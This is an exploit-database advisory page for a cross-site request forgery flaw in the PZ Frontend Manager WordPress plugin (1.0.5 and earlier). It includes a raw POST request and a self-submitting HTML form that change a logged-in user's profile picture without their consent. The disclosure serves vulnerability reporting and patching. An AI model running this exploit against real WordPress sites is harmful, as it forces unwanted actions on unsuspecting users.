---
title: PZ Frontend Manager WordPress Plugin 1.0.5 Cross Site Request Forgery (CSRF)
url: https://cxsecurity.com/issue/WLB-2025040015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-10
fetch_date: 2025-10-06T22:04:15.913466
---

# PZ Frontend Manager WordPress Plugin 1.0.5 Cross Site Request Forgery (CSRF)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PZ Frontend Manager WordPress Plugin 1.0.5 Cross Site Request Forgery (CSRF)** **2025.04.09**  Credit:  **[Vuln Seeker Cybersecurity Team](https://cxsecurity.com/author/Vuln%2BSeeker%2BCybersecurity%2BTeam/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")** | |

# Exploit Title: pz-frontend-manager <= 1.0.5 - CSRF change user profile
picture
# Date: 2024-07-01
# Exploit Author: Vuln Seeker Cybersecurity Team
# Vendor Homepage: https://wordpress.org/plugins/pz-frontend-manager/
# Version: <= 1.0.5
# Tested on: Firefox
# Contact me: vulns@vulnseeker.org
The plugin does not have CSRF checks in some places, which could allow
attackers to make logged in users perform unwanted actions via CSRF attacks.
Proof of concept:
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost:10003
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0)
Gecko/20100101 Firefox/124.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1093
Origin: http://localhost:10003
Sec-GPC: 1
Connection: close
Cookie: Cookie
action=pzfm\_upload\_avatar&imageData=data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAADcAAAA3CAAAAACNsI2aAAAACXBIWXMAAAB5AAAAeQBPsriEAAAB6ElEQVR42rVWO46EMAzNadAcY3vaOQMXoXcXKZehS8NpqNxamw8JxDYra1Zjhgge9jhx%2FBy7bYvtl4Y8Qn%2BtEjty6WxuQ0KkfOM5wJEeEkT1bsigU%2BxGQV%2BQfZ2ned0LAkLnyQ4XV2XB%2Fk%2BjXdTs8Mc1%2BUlvQehEt5Fit7hLFsUfqfOk3d1lJ9VO%2BqN1sFvJm%2BIScB7s3uo8ZVzC8RrsXjIuqp2n0d%2BsxFNbHxCw9cF34yn2L5jyJWndIprzRfqLpvw0%2B6PCh1fjgxpP5NL4VzlYEa6zOYDgzyvk0cMbykMek6THipSXAD5%2FBKh8H%2F3JGZTxPgM9Px9WDL0CkM1ORJie48nsWAXQ8kW1YxlknKfIWJs%2FEBXgoZ6Jf2KMNMYz4FgBJjTGkxR%2FH67vm%2FH8eP9ShlyRqfli24c0svy0zLNXgOkNtQJEle%2FP%2FMPOv8T3TGZIZIbO7sL7BMON74nkuQqUj4XvnMvwiNCBjO%2Byev2NVDtZLeX5rvD9lu0zauxW%2Ba6dBvJ8H5Gyfzz3wIBkO57rYECyHeeWF%2BxW%2BYcT47Jkdzi4TpT%2BlPNdIv9Z34fxNOxf0PhO91yw5MuMen56AxLPOtG7W9T63SCQ2k9Uol1so3bVnrog2JTyU57n1bb37n3s5s8Of5RfsaTdSlfuyUAAAAA8dEVYdGNvbW1lbnQAIEltYWdlIGdlbmVyYXRlZCBieSBHTlUgR2hvc3RzY3JpcHQgKGRldmljZT1wbm1yYXcpCvqLFvMAAABKdEVYdHNpZ25hdHVyZQA4NWUxYWU0YTJmYmE3OGVlZDRmZDhmMGFjZjIzNzYwOWU4NGY1NDk2Y2RlMjBiNWQ3NmM5Y2JjMjk4YzRhZWJjJecJ2gAAAABJRU5ErkJggg%3D%3D&userID=1
CSRF Exploit:
<html>
<body>
<form action="http://localhost:10003/wp-admin/admin-ajax.php"
method="POST">
<input type="hidden" name="action" value="pzfm\_upload\_avatar" />
<input type="hidden" name="imageData"
value="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADcAAAA3CAAAAACNsI2aAAAACXBIWXMAAAB5AAAAeQBPsriEAAAB6ElEQVR42rVWO46EMAzNadAcY3vaOQMXoXcXKZehS8NpqNxamw8JxDYra1Zjhgge9jhx/By7bYvtl4Y8Qn+tEjty6WxuQ0KkfOM5wJEeEkT1bsigU+xGQV+QfZ2ned0LAkLnyQ4XV2XB/k+jXdTs8Mc1+UlvQehEt5Fit7hLFsUfqfOk3d1lJ9VO+qN1sFvJm+IScB7s3uo8ZVzC8RrsXjIuqp2n0d+sxFNbHxCw9cF34yn2L5jyJWndIprzRfqLpvw0+6PCh1fjgxpP5NL4VzlYEa6zOYDgzyvk0cMbykMek6THipSXAD5/BKh8H/3JGZTxPgM9Px9WDL0CkM1ORJie48nsWAXQ8kW1YxlknKfIWJs/EBXgoZ6Jf2KMNMYz4FgBJjTGkxR/H67vm/H8eP9ShlyRqfli24c0svy0zLNXgOkNtQJEle/P/MPOv8T3TGZIZIbO7sL7BMON74nkuQqUj4XvnMvwiNCBjO+yev2NVDtZLeX5rvD9lu0zauxW+a6dBvJ8H5Gyfzz3wIBkO57rYECyHeeWF+xW+YcT47Jkdzi4TpT+lPNdIv9Z34fxNOxf0PhO91yw5MuMen56AxLPOtG7W9T63SCQ2k9Uol1so3bVnrog2JTyU57n1bb37n3s5s8Of5RfsaTdSlfuyUAAAAA8dEVYdGNvbW1lbnQAIEltYWdlIGdlbmVyYXRlZCBieSBHTlUgR2hvc3RzY3JpcHQgKGRldmljZT1wbm1yYXcpCvqLFvMAAABKdEVYdHNpZ25hdHVyZQA4NWUxYWU0YTJmYmE3OGVlZDRmZDhmMGFjZjIzNzYwOWU4NGY1NDk2Y2RlMjBiNWQ3NmM5Y2JjMjk4YzRhZWJjJecJ2gAAAABJRU5ErkJggg=="
/>
<input type="hidden" name="userID" value="1"" />
<input type="submit" value="Submit request" />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
Profile picture of user 1 will be changed in the dashboard
http://localhost:10003/dashboard/?dashboard=profile
Reference:
https://wpscan.com/vulnerability/73ba55a5-6cff-40fc-9686-30c50f060732/

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040015)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top